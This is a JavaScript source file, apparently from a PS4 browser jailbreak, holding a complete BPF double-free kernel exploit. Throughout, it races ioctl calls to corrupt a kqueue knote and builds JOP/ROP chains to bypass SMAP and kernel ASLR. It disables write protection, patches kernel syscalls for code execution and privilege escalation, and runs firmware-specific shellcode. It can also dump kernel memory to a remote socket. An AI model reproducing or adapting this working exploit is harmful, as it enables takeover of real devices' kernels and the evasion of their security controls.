function kernExploit_bpf_double_free() {
	try {
		var dump_size = 0x69B8000;
		
		// 1. Open /dev/bpf0 to acquire a reference to a BPF device
		
		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd == (-1 >>> 0))
			throw "Failed to open first /dev/bpf0 device!"
		var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd1 < 0)
			throw "Failed to open second /dev/bpf0 device!";
		
		// 2. Write BPF programs
		
		var bpf_valid = p.malloc32(0x4000);
		var bpf_spray = p.malloc32(0x4000);
		var bpf_valid_u32 = bpf_valid.backing;
		
		var bpf_valid_prog = p.malloc(0x40);
		p.write8(bpf_valid_prog, 0x800 / 8);
		p.write8(bpf_valid_prog.add32(8), bpf_valid);
		
		var bpf_spray_prog = p.malloc(0x40);
		p.write8(bpf_spray_prog, 0x800 / 8);
		p.write8(bpf_spray_prog.add32(8), bpf_spray);
		
		for (var i = 0; i < 0x400;) { // Fill valid BPF program with BPF "NOPs"
			bpf_valid_u32[i++] = 6; // BPF_RET
			bpf_valid_u32[i++] = 0; // 0
		}
		
		if (p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog).low != 0) // Load valid BPF program in a BPF device
			throw "Failed to open bpf device!";
		
		// Start setting up kernel ROP chain
		var krop = new rop();
		var kscratch = p.malloc32(0x1000);
		var ctxp = p.malloc32(0x1000); // ctxp = knote
		var ctxp1 = p.malloc32(0x1000); // ctxp1 = knote->kn_fops
		var ctxp2 = p.malloc32(0x1000);
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(dest_offset);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch);			
			krop.push(window.gadgets["add rax, [rdi]"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(patch_data_qword);
			krop.push(window.gadgets["mov [rdx], rax"]);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(dest_offset);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(src_offset);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov [rdx], rax"]);
		}

		/**
			* Qwerty Madness!
			* -
			* This section contains magic. It's for bypassing Sony's ghetto "SMAP".
			* Need to be a level 99 mage to understand this completely (not really but kinda). ~ Specter and CelesteBlue
		**/
		
		var stackshift_from_retaddr = 0;
		
		p.write8(bpf_spray.add32(0x10), ctxp); // Spray heap with the fake knote object
		p.write8(ctxp.add32(0x50), 0); // Set knote->kn_status to 0 to detach (clear flags so detach is called)
		p.write8(ctxp.add32(0x68), ctxp1); // Set knote->kn_fops to fake function table
		
		//p.write8(ctxp1.add32(0x10), window.gadgets["infloop"]); // Set kn_fops->f_detach to first JOP gadget
		p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]); // Set kn_fops->f_detach to first JOP gadget
		stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
		
		p.write8(ctxp.add32(0x00), ctxp2); // Set kn_link (set rdi) - not important for kqueue per se, but for the JOP gadget
		p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));
		//p.write8(ctxp2.add32(window.gadgets_shift["jump_shift_jop1"]), window.gadgets["infloop"]); // Chain to next gadget
		p.write8(ctxp2.add32(window.gadgets_shift["jump_shift_jop1"]), window.gadgets["jop2"]); // Chain to next gadget
		
		var iterbase = ctxp2;
		
		for (var i = 0; i < 0xF; i++) {
			p.write8(iterbase, window.gadgets["jop1"]); // Chain to next gadget
			stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
			
			p.write8(iterbase.add32(window.gadgets_shift["jump_shift_jop1"] + 0x20), window.gadgets["jop2"]); // Chain to next gadget
			
			p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
			p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
			iterbase = iterbase.add32(0x20);
		}
		
		var raxbase = iterbase;
		var rdibase = iterbase.add32(0x08);
		var memcpy = p.read8(get_jmptgt(window.gadgets["memcpy"]));
		
		//p.write8(raxbase, window.gadgets["infloop"]); // Chain to next gadget
		p.write8(raxbase, window.gadgets["jop3"]); // Chain to next gadget
		stackshift_from_retaddr += 0x8;
		
		//p.write8(rdibase.add32(0x70), window.gadgets["infloop"]); // Chain to next gadget
		p.write8(rdibase.add32(0x70), window.gadgets["jop4"]); // Chain to next gadget
		if (window.ps4_fw >= 450)
			stackshift_from_retaddr += 0x8;
		
		p.write8(rdibase.add32(0x18), rdibase); // Set RDI to rdibase
		p.write8(rdibase.add32(0x08), krop.stackBase); // Set RSI to kROP stack location
		p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]); // Save RSP to RBP
		
		p.write8(rdibase, raxbase); // [rdi] = rax
		p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop5"]), window.gadgets["jop6"]); // Chain to next gadget
		stackshift_from_retaddr += window.gadgets_shift["stackshift_jop6"];
		
		var topofchain = stackshift_from_retaddr;
		p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop6"]), memcpy.add32(0xC2 - 0x90)); // Chain to memcpy - skip prolog covering side effecting branch and skipping optimizations
		p.write8(rdibase.add32(0xB0), topofchain); // Set RDX to the write size for memcpy
		
		for (var i = 0; i < 0x1000 / 8; i++)
			p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
		
		krop.count = 0x10;
		
		/**
		* End of Qwerty madness
		**/
		
		p.write8(kscratch.add32(window.gadgets_shift["jump_shift_jop5"]), window.gadgets["pop rdi"]);
		p.write8(kscratch.add32(window.gadgets_shift["jump_shift_jop6"]), window.gadgets["pop rax"]);
		p.write8(kscratch.add32(0x18), kscratch);
		
		//krop.push(window.gadgets["infloop"]); // only for kexploit debug test
		
		krop.push(window.gadgets["pop rdi"]);
		krop.push(kscratch.add32(0x18));
		krop.push(window.gadgets["jop_mov rbp, rsp"]);
		
		var rboff = topofchain - krop.count * 8;
		
		krop.push(window.gadgets["jop6"]); // lea rdi, [rbp - 0x28]
		rboff += window.gadgets_shift["stackshift_jop6"];
		
		// Save to RDI the kqueue_close address for patching
		krop.push(window.gadgets["pop rax"]);
		krop.push(rboff);
		krop.push(window.gadgets["add rdi, rax; mov rax, rdi"]);
		
		// Defeat kernel ASLR
		krop.push(window.gadgets["mov rax, [rdi]"]);
		krop.push(window.gadgets["pop rcx"]);
		krop.push(window.kernel_offsets["kqueue_close_slide"]); // Slide of the return ptr from kernel base
		krop.push(window.gadgets["sub rax, rcx"]);
		krop.push(window.gadgets["mov rdx, rax"]);
		krop.push(window.gadgets["pop rsi"]);
		krop.push(kscratch);
		krop.push(window.gadgets["mov [rsi], rdx"]);
		
		// Patch kqueue_close to end cleanly
		krop.push(window.gadgets["pop rax"]);
		krop.push(window.gadgets["add rsp, 0x28"]);
		krop.push(window.gadgets["mov [rdi], rax"]);
		
        if (!dump_kernel || dump_kernel_with_patches) {
            alert("apply patches");

			// Disable kernel write protection
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(window.kernel_offsets["mov cr0, rax"]);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(0x80040033);
			krop.push(window.gadgets["jmp rdx"]);

            // Add custom sys_exec() call to execute arbitrary code as kernel

            /*alert("syscall_11_patch1_offset:" + window.kernel_offsets["syscall_11_patch1_offset"]);
            alert("syscall_11_patch2_offset:" + window.kernel_offsets["syscall_11_patch2_offset"]);
            alert("syscall_11_patch3_offset:" + window.kernel_offsets["syscall_11_patch3_offset"]);

            alert("syscall_11_2_patch1_offset:" + window.kernel_offsets["syscall_11_2_patch1_offset"]);
            alert("syscall_11_2_patch2_offset:" + window.kernel_offsets["syscall_11_2_patch2_offset"]);
            alert("syscall_11_2_patch3_offset:" + window.kernel_offsets["syscall_11_2_patch3_offset"]);*/

            /*kpatch((window.kernel_offsets["syscall_11_patch1_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_patch2_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_patch3_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));

            kpatch((window.kernel_offsets["syscall_11_2_patch1_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_2_patch2_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_2_patch3_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));*/

			kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
			kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
			kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));

            kpatch(window.kernel_offsets["syscall_11_2_patch1_offset"], 2);
			kpatch2(window.kernel_offsets["syscall_11_2_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
			kpatch(window.kernel_offsets["syscall_11_2_patch3_offset"], new int64(0, 1));

			// Patch sys_mmap: Allow RWX (read-write-execute) mapping
			kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
			
			// Patch sys_mprotect: Allow RWX (read-write-execute) mapping
			kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
			
			// Patch syscall: syscall instruction allowed anywhere
			kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
			kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
			
			// Patch sys_dynlib_dlsym: Allow from anywhere
			kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
			kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));

			// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
			
			// Enable kernel write protection
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(window.kernel_offsets["cpu_setregs"]);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["jmp rax"]);
		}
        
		if (dump_kernel) {
            alert("dump kernel");
            
			/*
			 * Memcpy the kernel to a userland buffer to send it over socket
			 *
			 * Note: void *memcpy(void *dest, const void *src, size_t size);
			 * rdi = dest
			 * rsi = src
			 * rdx = size
			 */
			
			// Put size into rdx
			krop.push(window.gadgets["pop rdx"]);
			krop.push(dump_size);
			
			// Put source into rsi in a creative way (JOP)
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(0);
			krop.push(window.gadgets["add rdi, rax; mov rax, rdi"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(window.gadgets["ret"]); // NOP
			krop.push(window.gadgets["mov rsi, rax; jmp rcx"]);
			
			var kernelBuf = p.malloc(dump_size);
			// Put destination into rdi
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kernelBuf);
			
			// Call memcpy
			krop.push(memcpy);
		}
		
		// Return to userland
		krop.push(window.gadgets["ret2userland"]);
		krop.push(kscratch.add32(0x1000));
		
		// END OF KROP SETUP

		// Allocate shellcode to clean up memory just after kernel exploit
		if (fwFromUA == "3.55") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14D02494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A790C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "4.05") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14D02494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A790C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "4.55") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x6A302494, 0x8D4DFFCF, 0xE18024B4, 0x8D4D000E, 0xE96024AC, 0x8149FFD0, 0x65A680C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "4.74") {
			var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0x48302494, 0x8d4dffcf, 0xcdf024b4, 0x8d4d000e, 0xc76024ac, 0x8149ffd0, 0x660570c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "5.01") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xDF8024B4, 0x8D4D0010, 0x5AB024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "5.05") {
            if (devkit == true)
            {
			    var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0x7CF024B4, 0x8D4D0016, 0x4C2024AC, 0x81490058, 0x6F89F0C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
            }
           else
            {
			   var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
            }
		}
		
		var shellbuf = p.malloc32(0x1000);
		for (var i = 0; i < shcode.length; i++)
			shellbuf.backing[i] = shcode[i];
		
		var interrupt, loop;
		// Spawn racing thread
		window.spawnthread(function (thread) {
			/*
			while (1) {
				ioctl(fd, BPF_SETWF, valid_prog);
				lock = 1;
				while (lock) {}
			}
			*/
			interrupt = thread.stackBase; // define global variable for cross-thread stack alteration
			thread.push(window.gadgets["ret"]); // padding
			thread.push(window.gadgets["ret"]); // padding
			thread.push(window.gadgets["ret"]); // padding
			
			// 1. Invoke ioctl(fd, BPF_SETWF, valid_prog);
			thread.push(window.gadgets["pop rdi"]);
			thread.push(fd);
			thread.push(window.gadgets["pop rsi"]);
			thread.push(0x8010427B);
			thread.push(window.gadgets["pop rdx"]);
			thread.push(bpf_valid_prog);
			thread.push(window.gadgets["pop rsp"]);
			thread.push(thread.stackBase.add32(0x800));
			thread.count = 0x800 / 8;
			var cntr = thread.count;
			thread.push(window.syscalls[54]); // sys_ioctl
			thread.push_write8(thread.stackBase.add32(cntr * 8), window.syscalls[54]); // Invoking syscall will corrupt stack with errno. Fixup.
			
			// 2. After 1 invocation, we just loop over and over with a pop rsp as a ghetto form of locking
			thread.push(window.gadgets["pop rdi"]);
			var wherep = thread.pushSymbolic();
			thread.push(window.gadgets["pop rsi"]);
			var whatp = thread.pushSymbolic();
			thread.push(window.gadgets["mov [rdi], rsi"]);
			
			thread.push(window.gadgets["pop rsp"]);
			
			loop = thread.stackBase.add32(thread.count * 8);
			thread.push(0x41414141);
			
			thread.finalizeSymbolic(wherep, loop);
			thread.finalizeSymbolic(whatp, loop.sub32(8));
		});
		
		// RACE!
		var race = new rop();
		var kq = p.malloc32(0x10);
		var kev = p.malloc32(0x100);
		kev.backing[0] = p.syscall("sys_socket", 2, 2);
		kev.backing[2] = 0x1ffff;
		kev.backing[3] = 1;
		kev.backing[4] = 5;
		
		
		/*while (1) {
			kq = kqueue();
			lock = 0; // -> this kicks off GottaGoFast (2nd thread)'s ioctl
			ioctl(fd, BPF_SETWF, valid_prog); // two threads will enter this in parallel
			kevent(kq, kev, 1, 0, 0); // attempt target alloc
			ioctl(fd, BPF_SETWF, spray); // will taint the heap, posssibly overwriting our kqueue's knote list
			close(kq); // if kqueue knote list is tainted, this will run rop chain
			if (kscratch[0] != 0) {
				// rop chain ran successfully!
			}
		}*/
		
		while (1) {
			race.count = 0;
			
			// Create a kqueue
			race.push(window.syscalls[362]); // sys_kqueue
			race.push(window.gadgets["pop rdi"]);
			race.push(kq);
			race.push(window.gadgets["mov [rdi], rax"]); // kq = (void *) kqueue();
			
			// Race against the other thread
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push_write8(loop, interrupt); // lock = 0; (breaks pop rsp loop in GottaGoFast)
			race.push(window.gadgets["pop rdi"]);
			race.push(fd);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B); // BPF_SETWF
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_valid_prog);
			race.push(window.syscalls[54]); // sys_ioctl(fd, BPF_SETWF, bpf_valid_prog);
			
			// Attempt to trigger double free()
			// Allocate target object: sys_kevent(kq, kev, 1, 0, 0);
			race.push(window.gadgets["pop rdi"]);
			race.push(kq.sub32(0x48));
			race.push(window.gadgets["mov rdi, [rdi+0x48]"]);
			race.push(window.gadgets["pop rsi"]);
			race.push(kev);
			race.push(window.gadgets["pop rdx"]);
			race.push(1);
			race.push(window.gadgets["pop rcx"]);
			race.push(0);
			race.push(window.gadgets["pop r8"]);
			race.push(0);
			race.push(window.syscalls[363]); // sys_kevent(*kq, kev, 1, 0, 0);
			
			// Spray via ioctl
			race.push(window.gadgets["pop rdi"]);
			race.push(fd1);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B); // BPF_SETWF
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_spray_prog);
			race.push(window.syscalls[54]); // sys_ioctl(fd1, BPF_SETWF, bpf_spray_prog);
			
			// Close the poisoned kqueue and run the kROP chain!
			race.push(window.gadgets["pop rdi"]);
			race.push(kq.sub32(0x48));
			race.push(window.gadgets["mov rdi, [rdi+0x48]"]);
			race.push(window.syscalls[6]); // sys_close(*kq);
			
			//alert("Gotta go fast!"); // for kexploit debugging
			race.run();
			//alert("after run");
			//sleep(1000);
			
			if (kscratch.backing[0] != 0) {
				alert("success");
                alert("Kernel base:" + p.read8(kscratch));
				if (dump_kernel) {
					var s = p.socket();
					p.connectSocket(s, socket_ip_pc, socket_port_send);
					alert("Starting kernel dumping to socket. Accept to continue.");
					p.writeSocket(s, kernelBuf, dump_size);
					p.closeSocket(s);
					alert("Kernel has theoritically been dumped on your target IP.");
				} /*else*/ {
					// Clean up memory
					p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
					p.fcall(shellbuf);
				}
				
				return true;
			}
		}
	} catch(ex) {
		fail(ex)
	}
	
	// failed (should never go here)
	return false;
}
